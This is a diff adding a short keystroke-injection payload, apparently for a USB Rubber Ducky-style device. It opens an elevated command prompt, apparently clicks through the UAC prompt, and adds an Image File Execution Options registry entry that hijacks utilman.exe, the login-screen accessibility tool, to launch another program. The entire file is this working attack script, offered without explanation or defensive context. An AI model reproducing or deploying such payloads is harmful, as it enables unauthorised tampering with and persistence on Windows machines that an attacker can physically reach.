@@ -1,0 +1,8 @@
+GUI r 
+DELAY 1 
+STRING cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\LaunchTM.exe" /f
+CTRL-SHIFT ENTER
+DELAY 500 
+LEFT
+DELAY 100
+ENTER
